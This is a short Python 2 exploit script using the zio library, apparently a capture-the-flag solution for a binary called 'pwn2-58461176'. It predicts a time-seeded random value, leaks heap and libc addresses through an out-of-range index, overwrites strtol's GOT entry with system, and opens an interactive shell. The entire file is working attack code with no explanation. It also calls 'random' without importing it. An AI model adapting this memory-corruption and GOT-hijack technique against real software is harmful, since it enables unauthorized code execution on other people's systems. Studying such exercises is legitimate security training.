from zio import *
import ctypes, os, time, urllib2

local = True

# attack pseudo-random
while True:
    if local:
        leak = int(os.popen('./leak ' + str(int(time.time()))).read())
    else:
        date = urllib2.urlopen('remote-server').headers['Date']
        leak = int(time.mktime(time.strptime(date, '%a, %d %b %Y  %H:%M:%S %Z')))
        leak += random.randint(0, 3)
    if leak ^ 0x40000000 >= 0x40000000:
        break
print '[+] random leak\t:\t' + hex(leak)

target  = './pwn2-58461176'
io      = zio(target, print_read = False, print_write = False, timeout = 10000)
# io.hint([0x80491e4])

io.wls_af('_CMD_$', ['sort', 2, leak ^ 0x40000000, 0x40000000])
io.wl(3)        # sort
io.wls([1, 2])  # query

# leak heap
io.rtl('[*L*] Query result:')
heap_base = ctypes.c_uint32(int(io.rl()[0:-1])).value - 0x38
print '[+] heap base\t:\t' + hex(heap_base)

# update
io.wls([2, 2, heap_base + 0x40])    
io.wl(7)        # exit

# reload
io.wls_af('_CMD_$', ['reload', 0])  

# leak libc
got_strtol = 0x804c01c
idx = str((got_strtol + 0x100000000 - (heap_base + 0x58)) / 4)
io.wls([1, idx])
io.rtl('[*L*] Query result:')
adr_strtol  = ctypes.c_uint32(int(io.rl()[0:-1])).value
print '[+] leak strtol\t: \t' + hex(adr_strtol)
off_strtol  = 0x000345c0
libc_base   = adr_strtol - off_strtol
print '[+] leak libc\t: \t' + hex(libc_base)
off_system  = 0x00040190
adr_system  = libc_base + off_system

# hijack strtol@got
io.wls([2, idx, ctypes.c_int32(adr_system).value])

# get shell
io.rtl('Choose:')
io.wl_af('Choose:', 'sh')

io.itr()
io.close()
